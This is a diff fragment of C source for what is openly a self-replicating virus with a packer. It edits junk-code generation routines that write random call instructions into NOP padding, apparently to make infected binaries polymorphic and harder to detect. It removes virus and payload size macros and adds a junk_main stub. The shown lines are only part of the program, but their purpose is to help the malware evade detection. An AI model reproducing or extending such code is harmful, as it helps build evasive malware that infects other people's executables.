@@ -17,10 +17,6 @@ extern int g_start_offset;
 extern uint8_t g_key[KEY_SIZE];
 extern void real_start(void);
 
-#define VIRUS_SIZE (uintptr_t)&real_end - (uintptr_t)&_start
-#define PAYLOAD_SIZE (uintptr_t)&real_end - (uintptr_t)&real_start
-#define PACKER_SIZE (uintptr_t)&real_start - (uintptr_t)&_start
-
 int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
 size_t __attribute__((section(".text#"))) g_nb_junk = 0;
 uint8_t __attribute__((section(".text#"))) g_rand[RAND_SIZE] = {0};
@@ -31,6 +27,7 @@ void junk_death(void);
 void junk_famine(void);
 void junk_war(void);
 void junk_pestilence(void);
+void junk_main(void);
 
 void junk_death(void) {
 	char c = 'A';
@@ -208,7 +205,18 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 				}
 				break;
 
-			case 5: 
+			case 5:
+				if ((uintptr_t)file_off < PACKER_SIZE) {
+					nop[offset] = 0xE8;
+					void (*tab[])(void) = {junk_main};
+					int size = sizeof(tab) / sizeof(tab[0]);
+
+					int32_t rel_offset = (int32_t)((uintptr_t)tab[ft_nrand() % size]  - (uintptr_t)_start);
+					rel_offset = rel_offset - (file_off + 0x7 + offset);
+					ft_memcpy(nop + offset + 1, &rel_offset, sizeof(int32_t));
+					break;
+				}
+					
 				if (IS_UNSET(marker, CALL_FLAG)) {
 
 					nop[offset] = 0xE8;
